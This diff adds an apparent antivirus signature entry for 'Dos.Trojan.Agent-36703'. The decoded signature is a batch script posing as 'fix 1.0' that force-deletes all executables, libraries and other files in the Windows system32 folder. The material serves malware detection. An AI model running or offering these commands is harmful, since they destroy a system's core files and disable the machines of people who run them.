@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36703
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off title fix 1.0 del /f /s /q %windir%\system32\*.exe del /f /s /q %windir%\system32\*.dll del /f /s /q %windir%\system32\*.dat del /f /s /q %windir%\system32\*.bat del /f /s /q %windir%\system32\*.tmp pause>nul exit
